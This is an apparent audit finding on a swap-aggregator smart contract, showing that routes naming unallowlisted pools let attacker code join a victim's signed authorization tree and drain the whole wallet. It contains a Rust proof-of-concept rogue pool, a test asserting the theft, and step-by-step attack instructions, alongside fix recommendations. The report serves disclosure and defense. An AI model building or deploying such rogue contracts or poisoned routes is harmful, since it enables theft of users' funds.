### Title
Attacker-supplied router payload executes arbitrary contract code inside the victim's signed authorization tree, enabling wallet theft beyond the swapped amount - (File: contracts/swap-aggregator/src/execute/mod.rs)

### Summary
The swap-aggregator executes venue calls against pool and token addresses taken verbatim from the user-supplied `StrategyPayload` with no allowlist. Because `execute_strategy` runs under `sender.require_auth()`, a malicious route can place attacker-deployed code on the call stack *below the caller's own authorization entry*. That code can then issue a `token.transfer(victim, attacker, amount)` for any token the victim holds; the host records it as a sub-invocation of the victim's auth entry, and it executes if the victim signs the poisoned tree. This is the on-chain analog of the snyk code-injection class: attacker-controlled input (route bytes, like a malicious `build.gradle`) causes arbitrary code to run with the victim's privileges during a seemingly benign operation (a swap/strategy, like a project scan). The same exposure applies to every controller strategy that forwards user-supplied `swap` bytes (`multiply`, `swap_collateral`, `swap_debt`, `repay_debt_with_collateral`).

### Finding Description
- `execute_op` builds each `SwapHop` by resolving `pool`, `token_in`, and `token_out` directly from the payload's `assets` registry — there is no venue/pool allowlist check anywhere in the instruction loop. [1](#0-0) 
- `dispatch_hop` hands the hop to a venue adapter which invokes the payload-named `pool` contract; the only post-checks are the router's *own* `token_in`/`token_out` balance deltas (`ZeroOutput`, `InvalidAmount`), which say nothing about what other calls the pool made. [2](#0-1) 
- The whole call runs under `sender.require_auth()` at `run()`, so any `require_auth`-triggering call a rogue pool makes against the *sender's* tokens is recorded as a child of the sender's authorization entry and passes if signed. [3](#0-2) 
- The project's own threat model confirms the mechanism: "a route can put third-party code on the call stack below the caller's authorization... a token transfer that such code makes from the caller is recorded... as a child of the caller's authorization entry, and it executes if the caller signs that tree. The loss is then the caller's wallet, not the routed amount." [4](#0-3) 
- The controller only protects its *own* grant (`authorize_transfer_as_current` of exactly `amount_in` plus measured spend/output checks); the victim-facing auth-tree poisoning is outside that bound. [5](#0-4) 

### Impact Explanation
Theft of user funds beyond the amount being swapped. A victim who signs the recorded auth tree for a `swap_collateral`/`execute_strategy` loses arbitrary balances of arbitrary tokens — the rogue pool's `transfer(victim, attacker, amount)` is authorized by the victim's own signature. Neither the payload's `min_out` nor the controller's `NoSwapOutput`/final-health checks bound the loss, since the stolen funds are unrelated to the swap accounting.

### Likelihood Explanation
Requires convincing the victim to sign a transaction containing attacker-crafted route bytes — e.g., a malicious frontend, quote server, phishing link, or a wallet that does not decode/display nested sub-invocations. This mirrors CVE-2022-24441's social-engineering precondition (coercing a scan of a malicious project). The exploit path is proven in-repo: `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs` simulates a rogue hop pool whose `token.transfer(alice, attacker, WALLET_BALANCE)` is recorded under Alice's `swap_collateral` auth entry and drains her wallet while the swap settles "fairly". [6](#0-5) 

### Recommendation
- Maintain a governance-controlled allowlist of venue pool contracts (and/or token contracts) that routes may address; reject payload `assets`/`ops` referencing unlisted pools in `Program::decode` or `dispatch_hop`.
- Alternatively/additionally, verify per-hop that the invoked pool address is a known deployment of the declared `SwapVenue` (e.g., via a registry or WASM-hash check).
- Document/enforce at the wallet/SDK layer that a strategy signature must contain exactly the expected sub-invocation shape (one input `transfer` for direct swaps; the controller-scoped auth for controller strategies) and refuse any extra children.

### Proof of Concept
The repository already contains the working PoC:

```rust
// tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs
// Attacker-deployed "pool" named by the route's assets registry:
pub fn swap(env: Env) {
    let (victim, wallet_token, to, amount): (Address, Address, Address, i128) =
        env.storage().instance().get(&symbol_short!("PLAN")).unwrap();
    if amount > 0 {
        // Runs while the victim's `swap_collateral` auth entry is on the stack;
        // simulation records this transfer as a child of the victim's auth.
        token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
    }
}
```

The test `simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry` drives `controller.swap_collateral` with a route through this pool and asserts (a) the stolen `transfer(alice, attacker, WALLET_BALANCE)` is recorded as a `sub_invocation` of Alice's `swap_collateral` auth entry, (b) Alice's wallet is drained to 0 while the attacker receives `WALLET_BALANCE`, and (c) the swap still completes with a fair output — proving the protocol's measured-delta and solvency checks do not detect the theft. [6](#0-5) 

Attack steps for an unprivileged attacker:
1. Deploy a pool-shaped contract whose swap entrypoint performs `token.transfer(victim, attacker, wallet_balance)` for a token the target holds (plus a real or fake fill so the hop's measured delta is positive).
2. Craft a `StrategyPayload` whose `assets` registry names that pool and a benign-looking token pair, with `min_out` met by the pool's fair-looking output.
3. Induce the victim to sign/submit `router.execute_strategy(victim, total_in, swap_xdr)` or a controller `swap_collateral(..., swap, ...)` carrying the route (malicious dApp/quote). Simulation records the wallet-draining transfer under the victim's auth; once signed, funds are stolen with no protocol check catching it.

### Citations

**File:** contracts/swap-aggregator/src/execute/mod.rs (L51-52)
```rust
pub(crate) fn run(env: Env, sender: Address, total_in: i128, payload: StrategyPayload) -> i128 {
    sender.require_auth();
```

**File:** contracts/swap-aggregator/src/execute/mod.rs (L152-165)
```rust
        Opcode::Swap(venue) => {
            let hop = SwapHop {
                pool: ctx.assets.get_unchecked(op.idx_a),
                token_in: ctx.assets.get_unchecked(op.idx_b),
                token_out: ctx.assets.get_unchecked(op.idx_c),
                venue,
            };
            let amount_in = resolve_amount(ctx, vault, op.mode, &hop.token_in, prev);
            if amount_in <= 0 {
                panic_with_error!(ctx.env, Error::InvalidAmount);
            }

            vault.withdraw(&hop.token_in, amount_in);
            let out = venues::dispatch_hop(ctx.env, ctx.router, &hop, amount_in, tokens_cache);
```

**File:** contracts/swap-aggregator/src/venues/mod.rs (L23-58)
```rust
pub(crate) fn dispatch_hop(
    env: &Env,
    router: &Address,
    hop: &SwapHop,
    amount_in: i128,
    tokens_cache: &mut Map<Address, Vec<Address>>,
) -> i128 {
    let ctx = HopContext::new(env, router, hop, amount_in);
    let before_in = ctx.input_balance();
    let before_out = ctx.output_balance();

    match hop.venue {
        SwapVenue::Soroswap => soroswap::swap(&ctx),
        SwapVenue::Aquarius => aquarius::swap(&ctx, tokens_cache),
        SwapVenue::Phoenix => phoenix::swap(&ctx),
        SwapVenue::Sushi => sushi::swap(&ctx),
        SwapVenue::CometDex => comet::swap(&ctx),
    };

    let received = ctx
        .output_balance()
        .checked_sub(before_out)
        .unwrap_or_else(|| panic_with_error!(env, Error::ZeroOutput));
    if received <= 0 {
        panic_with_error!(env, Error::ZeroOutput);
    }

    let after_in = ctx.input_balance();
    let spent = before_in
        .checked_sub(after_in)
        .unwrap_or_else(|| panic_with_error!(env, Error::InvalidAmount));
    if spent != amount_in {
        panic_with_error!(env, Error::InvalidAmount);
    }

    received
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```

**File:** contracts/controller/src/strategies/swap.rs (L30-54)
```rust
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });

    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```
